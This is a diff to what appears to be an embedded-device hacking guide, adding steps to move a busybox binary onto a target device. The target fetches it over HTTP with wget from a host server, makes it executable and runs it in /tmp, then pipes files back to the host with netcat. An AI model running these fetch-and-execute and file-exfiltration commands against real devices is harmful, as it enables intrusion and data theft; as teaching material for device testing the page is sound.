@@ -262,11 +262,43 @@ Reads network configuration data from the target device. The output shows us the
 
 
 
-**Transfer `busybox-mipsel` from host to device**
+**3.1 Transfer `busybox-mipsel` from host to device**
+
+{% file src="../../.gitbook/assets/busybox-mipsel" %}
+
+> You can also download directly from source: [https://busybox.net/downloads/binaries/1.21.1/busybox-mipsel](https://busybox.net/downloads/binaries/1.21.1/busybox-mipsel)
+
+Host a web server (eg. with Python3) on the host machine:
+
+```shellscript
+$ python3 -m http.server 8888 # or any other port of choice
+```
+
+Use Wget on the target device to retrieve the `busybox-mipsel` binary:
+
+{% code title="Target device" %}
+```console
+# wget http://<HOST-IP>:8888/busybox-mipsel -O /tmp/busybox
+# chmod +x /tmp/busybox 
+# /tmp/busybox
+```
+{% endcode %}
 
 <figure><img src="../../.gitbook/assets/image (245).png" alt="" width="563"><figcaption></figcaption></figure>
 
 > The `/tmp` directory will usually be used on an actual device to store the temporary binary. The `/root` directory works too (if you are root)
+
+**3.2 Transfer files from device to host**
+
+{% code title="Target device" %}
+```console
+# /tmp/busybox nc HOST-IP 8888 < FILE-TO-TRANSFER
+```
+{% endcode %}
+
+```shellscript
+$  nc -lp 8888 > OUTPUT-FILE
+```
 
 
 
